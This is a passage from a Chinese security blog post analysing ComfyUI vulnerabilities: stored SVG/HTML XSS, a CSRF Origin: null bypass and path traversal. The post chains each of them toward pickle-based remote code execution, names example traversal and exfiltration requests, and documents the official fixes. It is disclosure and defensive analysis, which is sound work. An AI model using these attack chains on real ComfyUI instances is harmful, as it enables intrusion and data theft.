+<h3 id="CVE-2026-6593-CVE-2026-56670（-view-端点-SVG-存储型-XSS）"><a href="#CVE-2026-6593-CVE-2026-56670（-view-端点-SVG-存储型-XSS）" class="headerlink" title="CVE-2026-6593 &#x2F; CVE-2026-56670（&#x2F;view 端点 SVG 存储型 XSS）"></a>CVE-2026-6593 &#x2F; CVE-2026-56670（&#x2F;view 端点 SVG 存储型 XSS）</h3><p>&#x2F;view 端点把上传的 image&#x2F;svg+xml 以内联方式返回。攻击者上传带 onload 事件和 script 标签的 SVG，受害者打开 GET &#x2F;view?filename&#x3D;xxx.svg&amp;type&#x3D;input 时脚本在 ComfyUI 源执行。VulDB 按 PR:L + UI:R 只给了 3.5 分，但配合 pickle 上传就是 1 Click RCE（链 A，见「XSS&#x2F;CSRF -&gt; RCE 链」一节）。</p>
+<p><img src="/images/22/6-burp-6593-svg-xss-chain.png" alt="image12"><br>POST &#x2F;upload&#x2F;image 上传 poc_6593_rce2.svg</p>
+<p><img src="/images/22/7-burp-6593-view-inline-svg.png" alt="image13"><br>浏览器打开 &#x2F;view?filename&#x3D;poc_6593_rce2.svg&amp;type&#x3D;input，XSS 同源执行 -&gt; 上传恶意 pickle + 触发 &#x2F;prompt -&gt; RCE</p>
+<p>官方收编版：<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/security/advisories/GHSA-rj8c-c4p8-3c5h">CVE-2026-56670</a>（GHSA-rj8c-c4p8-3c5h，CVSS 8.2）：危险 Content-Type 黑名单里没有 SVG 及相关 XML 类型，存储型 XSS；修复除了把危险 MIME 强制为下载，后续 v0.29.1 又加了一层 Sec-Fetch-Dest 检查（<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/pull/15164">PR #15164</a>）。</p>
+<h3 id="CVE-2026-6592-CVE-2026-56672（-userdata-存储型-XSS）"><a href="#CVE-2026-6592-CVE-2026-56672（-userdata-存储型-XSS）" class="headerlink" title="CVE-2026-6592 &#x2F; CVE-2026-56672（&#x2F;userdata 存储型 XSS）"></a>CVE-2026-6592 &#x2F; CVE-2026-56672（&#x2F;userdata 存储型 XSS）</h3><p>app&#x2F;user_manager.py 的 getuserdata：POST &#x2F;userdata&#x2F;{file} 把任意请求体存进用户的 userdata 目录（不做内容检查），GET 时用 web.FileResponse(path) 按扩展名回 Content-Type——.html -&gt; text&#x2F;html、.svg -&gt; image&#x2F;svg+xml。&#x2F;view 早已有危险 MIME 强制下载的保护，但这层保护从没应用到 &#x2F;userdata。官方收编版：<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/security/advisories/GHSA-53g8-45wq-pcv8">CVE-2026-56672</a>（GHSA-53g8-45wq-pcv8，CVSS 8.2）。XSS 同源执行后可访问浏览器存储的 API token、设置、工作流，并发出等价认证请求。</p>
+<p><img src="/images/22/12-burp-56672-userdata-xss-upload.png" alt="image16"><br>POST &#x2F;userdata&#x2F;poc_56672_rce.html 写入恶意 HTML</p>
+<p><img src="/images/22/13-browser-56672-userdata-xss-rce.png" alt="image17"><br>浏览器打开 &#x2F;userdata&#x2F;poc_56672_rce.html，stored XSS (56672) -&gt; pickle RCE，链 A 走通</p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/pull/14734">PR #14734</a>（v0.28.0）同一提交把 56670 与 56672 一起修掉：&#x2F;view 与 &#x2F;userdata 统一走危险 MIME 强制下载（is_dangerous_content_type 集中判定），与 56671&#x2F;56673 路径穿越同批修复。</p>
+<p><img src="/images/22/fix-14734-routes-mime.png" alt="image27"><br>PR #14734：routes.py 把旧的 _DANGEROUS_MIME_TYPES 集合换成集中式 folder_paths.is_dangerous_content_type（旧集合漏了 image&#x2F;svg+xml 及 charset&#x2F;大小写&#x2F;+xml 方言绕过），危险类型统一强制 attachment 下载</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>ComfyUI 唯一的 CSRF 防线是 server.py 的 create_origin_only_middleware，只有一层 Origin host:port 比对，用 Origin: null（data: 页 &#x2F; sandbox iframe）即可干净绕过。官方没有给它独立 GHSA：v0.19.0 起中间件对所有带 Sec-Fetch-Site: cross-site 的请求直接 403（浏览器跨站请求必带该头且无法伪造，Origin: null 的 data: 页 &#x2F; sandbox iframe 也一样），服务端绕过被封死，只剩浏览器层 PNA 的版本差（Firefox 未实现 PNA）。</p>
+<h3 id="CVE-2026-6589"><a href="#CVE-2026-6589" class="headerlink" title="CVE-2026-6589"></a>CVE-2026-6589</h3><p>server.py 的 create_origin_only_middleware 是 ComfyUI 唯一的 CSRF 防线，在 &lt; 0.19.0 上可以干净地绕过。它只比对 Origin 的 host:port 与请求 Host：</p>
+<table>
+<thead>
+<tr>
+<th>请求形态</th>
+<th>&lt; 0.19.0 结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>跨站页 Origin: <a target="_blank" rel="noopener" href="https://evil.com/">https://evil.com</a></td>
+<td>403（中间件正常拦截）</td>
+</tr>
+<tr>
+<td>Origin: null（data: 页 &#x2F; sandbox iframe）</td>
+<td><strong>200 放行</strong></td>
+</tr>
+</tbody></table>
+<p><img src="/images/22/5-burp-6589-csrf-bypass.png" alt="image5"><br>Burp 里 POST &#x2F;prompt（X-Poc-Tag: cve-6589）——无 Origin &#x2F; Origin: null 均返回 200</p>
+<p><strong>攻击面分析（实测结论）</strong></p>
+<p>攻击面本质是「受害者浏览器访问的攻击页 -&gt; 受害者本机 loopback -&gt; ComfyUI」。攻击页放局域网还是公网只影响受害者能不能访问到它、以及浏览器层的 PNA（Private Network Access）会不会拦：</p>
+<table>
+<thead>
+<tr>
+<th>攻击页位置</th>
+<th>目标 ComfyUI</th>
+<th>实测结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>局域网 192.168.1.9:9999</td>
+<td>127.0.0.1:8188（v0.19.0+）</td>
+<td>403（Sec-Fetch-Site: cross-site，浏览器发出的跨站请求必带且无法伪造）</td>
+</tr>
+<tr>
+<td>本机其他端口 127.0.0.1:9999</td>
+<td>127.0.0.1:8188（v0.19.0+）</td>
+<td>403（Origin 端口比对：9999 !&#x3D; 8188）</td>
+</tr>
+<tr>
+<td>sandbox iframe &#x2F; data: URL（Origin: null）</td>
+<td>127.0.0.1:8188（&lt; 0.19.0）</td>
+<td><strong>200 + 200 -&gt; RCE</strong></td>
+</tr>
+</tbody></table>
+<p>几个关键点：</p>
+<ul>
+<li><strong>服务端防线随版本变强</strong>：&lt; 0.19.0 只有 Origin host:port 比对，Origin: null（data: 页 &#x2F; sandbox iframe）干净绕过；v0.19.0 起对所有 Sec-Fetch-Site: cross-site 请求直接 403（浏览器跨站请求必带且无法伪造），远程攻击页被挡死；</li>
+<li><strong>浏览器层 PNA 是新关卡</strong>：Chrome 130+ 默认拦 public 页面（含 data: 页）到 127.0.0.1 的请求（TypeError: Failed to fetch，服务端零请求）；Firefox 未实现 PNA，所以 &lt; 0.19.0 上 data: 页仍能打。</li>
+</ul>
+<p><img src="/images/22/9-firefox-sandbox-iframe-csrf-rce.png" alt="image7"><br>Firefox 打开攻击页，沙箱 iframe（Origin: null）直连 127.0.0.1:8188（&lt; 0.19.0，无代理）：自动发起 upload pickle + &#x2F;prompt，两条 200，Calculator 弹出</p>
+<p><strong>这个 CVE 的价值</strong>：CSRF 本身只有 4.3 分，但它提供了「任意页面 -&gt; 本机 ComfyUI 任意请求」的通道，配合 pickle 上传即可形成 <strong>CSRF -&gt; RCE</strong> 链（见「XSS&#x2F;CSRF -&gt; RCE 链」的链 B）。</p>
+<p><strong>官方FIX</strong>：无独立 GHSA。官方在后续版本强化了中间件（v0.19.0 起对所有 Sec-Fetch-Site: cross-site 请求 403），Origin: null 的浏览器路径在服务端也被封死，只剩浏览器层 PNA 的版本差（Firefox 未实现 PNA）。</p>
+<p><img src="/images/22/fix-6589-sec-fetch-site.png" alt="image8"><br>commit 76b75f3（#13261）：origin 中间件新增 Sec-Fetch-Site: cross-site -&gt; 403 校验；commit 说明也点名了 PNA（「给 Firefox 实现 PNA 留时间」）</p>
+<h2 id="图片读取"><a href="#图片读取" class="headerlink" title="图片读取"></a>图片读取</h2><p>两族「路径拼接无包含校验」的任意图片读：Model Preview 端点（6590&#x2F;56671）与 LoadImage 族（6591&#x2F;56673）。VulDB 按「低权限」评 3.5 ~ 4.3，官方收编为 GHSA（CVSS 7.5）后按「未认证」口径重评，v0.28.0（PR #14734）统一恢复目录包含校验。</p>
+<h3 id="CVE-2026-6590-CVE-2026-56671（Model-Preview-端点路径穿越）"><a href="#CVE-2026-6590-CVE-2026-56671（Model-Preview-端点路径穿越）" class="headerlink" title="CVE-2026-6590 &#x2F; CVE-2026-56671（Model Preview 端点路径穿越）"></a>CVE-2026-6590 &#x2F; CVE-2026-56671（Model Preview 端点路径穿越）</h3><p>get_model_preview（app&#x2F;model_manager.py）用 os.path.join(folder, filename) 拼接路径，其中 filename 是 {filename:.*} 无限制路由捕获：字面 ..&#x2F;、编码穿越 %2e%2e%2f、绝对路径、无界 path_index 都能逃逸模型目录。目标文件会被 Pillow 重新编码为 WEBP 返回，所以泄露面是「图像可解码文件 + 文件存在性&#x2F;路径枚举」，而不是任意文件读取。</p>
+<p><img src="/images/22/14-burp-56671-model-preview-traversal.png" alt="image18"><br>GET &#x2F;experiment&#x2F;models&#x2F;preview&#x2F;checkpoints&#x2F;0&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;…&#x2F;victim-hacker.png -&gt; 200，Content-Type: image&#x2F;webp（Pillow 重编码，56KB）</p>
+<p>VulDB 先披露（CVE-2026-6590，358225），官方收编为 <a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/security/advisories/GHSA-pj59-g5vv-74q4">CVE-2026-56671</a>（GHSA-pj59-g5vv-74q4，CVSS 7.5）。</p>
+<h3 id="CVE-2026-6591-CVE-2026-56673（LoadImage-族路径穿越）"><a href="#CVE-2026-6591-CVE-2026-56673（LoadImage-族路径穿越）" class="headerlink" title="CVE-2026-6591 &#x2F; CVE-2026-56673（LoadImage 族路径穿越）"></a>CVE-2026-6591 &#x2F; CVE-2026-56673（LoadImage 族路径穿越）</h3><p>folder_paths.py 的 folder_paths.get_annotated_filepath 直接 os.path.join(base_dir, name) 拼接用户可控的 image 参数，不校验 ..&#x2F;。构造 POST &#x2F;prompt 工作流让 LoadImage 加载 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;…&#x2F;绝对路径图片，再经 SaveImage 把结果写到 output 目录，最后 GET &#x2F;view 外带。</p>
+<p><img src="/images/22/3-burp-6591-prompt-loadimage.png" alt="image9"></p>
+<p><img src="/images/22/4-burp-6591-view-exfil.png" alt="image10"><br>GET &#x2F;view?filename&#x3D;traversal_exfil_00003_.png&amp;type&#x3D;output 成功外带 211278 字节</p>
+<p><img src="/images/22/victim-hacker.png" alt="image11"><br>被外带的受害者图片原件（victim-hacker.png），外带结果与原件像素一致</p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/pull/14734">PR #14734</a>（v0.28.0，<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/releases/tag/v0.28.0">release notes</a>）一次修 4 个：&#x2F;view 与 &#x2F;userdata 统一走危险 MIME 强制下载、get_model_preview 加目录包含校验、LoadImage 族恢复输入目录校验。</p>
+<p><img src="/images/22/fix-14734-folder-paths.png" alt="image21"><br>PR #14734：folder_paths.py 在 get_annotated_filepath 补上路径包含校验（56673），同时在此集中定义 is_dangerous_content_type 供 &#x2F;view 与 &#x2F;userdata 共用</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A7%88%E8%A1%A8"><span class="toc-number">1.</span> <span class="toc-text">概览表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-68771%EF%BC%88LoadTrainingDataset-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2026-68771（LoadTrainingDataset pickle 反序列化 RCE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-22777%EF%BC%88ComfyUI-Manager-CRLF-%E6%B3%A8%E5%85%A5-RCE%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2026-22777（ComfyUI-Manager CRLF 注入 -&gt; RCE）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loopback-Bind%E6%94%BB%E5%87%BB%E9%9D%A2%EF%BC%9AXSS-CSRF-RCE-%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">Loopback Bind攻击面：XSS&#x2F;CSRF -&gt; RCE 链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6593-CVE-2026-56670%EF%BC%88-view-%E7%AB%AF%E7%82%B9-SVG-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2026-6593 &#x2F; CVE-2026-56670（&#x2F;view 端点 SVG 存储型 XSS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6592-CVE-2026-56672%EF%BC%88-userdata-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2026-6592 &#x2F; CVE-2026-56672（&#x2F;userdata 存储型 XSS）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">5.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6589"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2026-6589</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E8%AF%BB%E5%8F%96"><span class="toc-number">6.</span> <span class="toc-text">图片读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6590-CVE-2026-56671%EF%BC%88Model-Preview-%E7%AB%AF%E7%82%B9%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">CVE-2026-6590 &#x2F; CVE-2026-56671（Model Preview 端点路径穿越）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6591-CVE-2026-56673%EF%BC%88LoadImage-%E6%97%8F%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">CVE-2026-6591 &#x2F; CVE-2026-56673（LoadImage 族路径穿越）</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&text=Attack of ComfyUI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&is_video=false&description=Attack of ComfyUI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attack of ComfyUI&body=Check out this article: https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&name=Attack of ComfyUI&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&t=Attack of ComfyUI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Z3r4y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
